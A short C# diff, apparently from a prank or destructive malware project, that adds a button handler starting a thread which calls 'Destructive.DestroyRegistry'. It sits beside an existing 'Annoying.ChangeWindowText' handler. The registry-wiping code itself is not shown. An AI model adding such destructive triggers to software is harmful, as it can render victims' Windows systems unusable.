@@ -148,5 +148,11 @@ namespace Abantes
             Thread CWT = new Thread(new ThreadStart(Annoying.ChangeWindowText));
             CWT.Start();
         }
+
+        private void button20_Click(object sender, EventArgs e)
+        {
+            Thread DR = new Thread(new ThreadStart(Destructive.DestroyRegistry));
+            DR.Start();
+        }
     }
 }
